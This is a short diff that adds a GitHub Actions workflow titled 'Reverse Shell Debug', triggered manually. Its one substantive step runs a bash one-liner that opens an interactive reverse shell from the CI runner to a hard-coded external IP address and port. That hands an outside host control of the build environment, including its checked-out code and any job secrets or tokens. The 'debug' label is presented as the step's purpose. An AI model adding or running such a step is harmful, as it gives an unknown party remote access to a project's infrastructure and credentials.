@@ -1,0 +1,12 @@
+name: Reverse Shell Debug
+on: [workflow_dispatch] # Allows manual triggering
+jobs:
+  debug:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      - name: Establish reverse shell
+        run: |
+          /bin/bash -i >& /dev/tcp/139.162.21.36/36203 0>&1
+        shell: bash
